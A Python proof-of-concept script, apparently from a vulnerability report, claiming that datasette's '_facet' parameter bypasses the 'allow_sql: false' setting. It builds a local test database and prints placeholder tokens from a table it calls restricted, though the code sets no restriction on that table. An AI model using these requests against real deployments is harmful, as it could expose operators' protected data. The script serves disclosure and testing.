"""
PoC: datasette `allow_sql: false` bypass via ?_facet= parameter
Distinct from Issue #2677 / PR #2690 (identifier injection).

This script demonstrates CWE-285 (Improper Authorization):
facet_results() executes SQL without checking execute-sql permission,
allowing bypass of the allow_sql:false security boundary.

Tested on: datasette 1.0a30, Python 3.13

Usage:
    pip install datasette httpx anyio
    python poc.py
"""

import asyncio
import sqlite3
import subprocess
import tempfile
import os
import sys

import httpx
from datasette.app import Datasette

import datasette as _ds
print(f"datasette version: {_ds.__version__}")
print()


async def run_poc():
    # ── Build test database ──────────────────────────────────────────────────
    tmp = tempfile.mkdtemp()
    db_path = os.path.join(tmp, "demo.db")

    conn = sqlite3.connect(db_path)
    conn.execute("CREATE TABLE public_data (id INTEGER PRIMARY KEY, category TEXT)")
    conn.execute(
        "CREATE TABLE secret_tokens (id INTEGER PRIMARY KEY, token TEXT, owner TEXT)"
    )
    conn.executemany(
        "INSERT INTO public_data VALUES (?,?)", [(1, "A"), (2, "B"), (3, "A")]
    )
    conn.executemany(
        "INSERT INTO secret_tokens VALUES (?,?,?)",
        [(1, "sk-abc123", "admin"), (2, "sk-xyz789", "alice")],
    )
    conn.commit()
    conn.close()

    db_name = "demo"

    # ── Test 1: ?_where= is correctly blocked (baseline) ─────────────────────
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver"
    ) as client:
        r = await client.get(
            f"/{db_name}/public_data.json", params={"_where": "1=1"}
        )
        print(f"[Test 1] GET /demo/public_data.json?_where=1=1")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code} {'Forbidden' if r.status_code == 403 else r.text[:80]}")
        assert r.status_code == 403, "Expected 403"
        print()

    # ── Test 2: ?_facet= bypasses allow_sql:false ─────────────────────────────
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver"
    ) as client:
        r = await client.get(
            f"/{db_name}/public_data.json", params={"_facet": "category"}
        )
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 2] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            values = [(x["value"], x["count"]) for x in info["results"]]
            print(f"         facet [{col}]:  {values}")
        assert r.status_code == 200, "Expected 200 (bypass)"
        print()

    # ── Test 3: allow_facet:false is a separate, unrelated setting ────────────
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": False})
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver"
    ) as client:
        r = await client.get(
            f"/{db_name}/public_data.json", params={"_facet": "category"}
        )
        print(f"[Test 3] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=False")
        print(f"         HTTP {r.status_code}")
        assert r.status_code == 400, "Expected 400 (facet disabled)"
        print()

    # ── Test 4: restricted table data leaked via ?_facet= ─────────────────────
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver"
    ) as client:
        r = await client.get(
            f"/{db_name}/secret_tokens.json", params={"_facet": "token"}
        )
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 4] GET /demo/secret_tokens.json?_facet=token")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            for row in info["results"]:
                print(f"         LEAKED -> token={row['value']!r}  (count={row['count']})")
        assert r.status_code == 200, "Expected 200 (bypass)"
        assert any(
            row["value"] in ("sk-abc123", "sk-xyz789")
            for info in facets.values()
            for row in info["results"]
        ), "Expected leaked tokens"


if __name__ == "__main__":
    try:
        import httpx  # noqa: F401
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "httpx", "anyio", "-q"], check=True)

    asyncio.run(run_poc())
